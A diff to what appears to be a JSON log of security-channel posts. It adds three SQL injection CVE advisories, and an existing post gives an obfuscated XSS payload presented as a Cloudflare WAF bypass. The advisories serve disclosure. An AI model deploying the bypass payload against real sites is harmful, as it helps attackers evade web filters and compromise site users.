@@ -1,5 +1,20 @@
 {
     "date": "2023-10-20",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-37824 ‼\n\nSitolog sitologapplicationconnect v7.8.a and before was discovered to contain a SQL injection vulnerability via the component /activate_hook.php.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-10-20",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-5681 ‼\n\nA vulnerability, which was classified as critical, was found in Netentsec NS-ASG Application Security Gateway 6.3. This affects an unknown part of the file /admin/list_addr_fwresource_ip.php. The manipulation leads to sql injection. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used. The identifier VDB-243057 was assigned to this vulnerability. NOTE: The vendor was contacted early about this disclosure but did not respond in any way.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-10-20",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-5682 ‼\n\nA vulnerability has been found in Tongda OA 2017 and classified as critical. This vulnerability affects unknown code of the file general/hr/training/record/delete.php. The manipulation of the argument RECORD_ID leads to sql injection. The exploit has been disclosed to the public and may be used. Upgrading to version 11.10 is able to address this issue. It is recommended to upgrade the affected component. VDB-243058 is the identifier assigned to this vulnerability. NOTE: The vendor was contacted early about this disclosure but did not respond in any way.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-10-20",
     "from_channel": "proxy_bar",
     "message": "Cloudflare bypass WAF\n*\nPayload:\n<inpuT autofocus oNFocus=\"setTimeout(function() { /*\\`*/top['al'+'\\u0065'+'rt']([!+[]+!+[]]+[![]+[]][+[]])/*\\`*/ }, 5000);\"></inpuT%3E&lT;/stYle&lT;/titLe&lT;/teXtarEa&lT;/scRipt&gT;\n\n#cloudflare #bypass #waf #xss",
     "urls": []
